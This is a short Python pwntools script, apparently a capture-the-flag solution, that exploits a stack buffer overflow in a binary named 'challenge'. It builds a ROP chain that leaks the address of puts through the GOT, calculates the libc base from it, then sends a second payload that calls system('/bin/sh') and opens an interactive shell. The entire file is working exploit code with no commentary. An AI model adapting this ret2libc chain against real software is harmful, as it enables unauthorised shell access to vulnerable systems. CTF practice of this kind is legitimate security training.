from pwn import * 

r = process('./challenge')
# r = remote('34.175.151.38',2682)
rdi = 0x0000000000401393
ret = 0x000000000040101a
elf = context.binary = ELF('./challenge')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

payload = b'a'*0x38 + p64(rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])
r.sendlineafter(b'What is your name? ',payload)
r.sendline(b'\x00')
r.recvuntil(b'None!')
leak = u64(r.recvuntil(b'\x7f')[1:].ljust(8,b'\x00'))

print(hex(leak))
# gdb.attach(r)
libc.address = leak - libc.sym['puts']
print(hex(libc.address))
payload_ = b'a'*0x38 + p64(ret) + p64(rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
r.sendlineafter(b'What is your name? ',payload_)
r.interactive()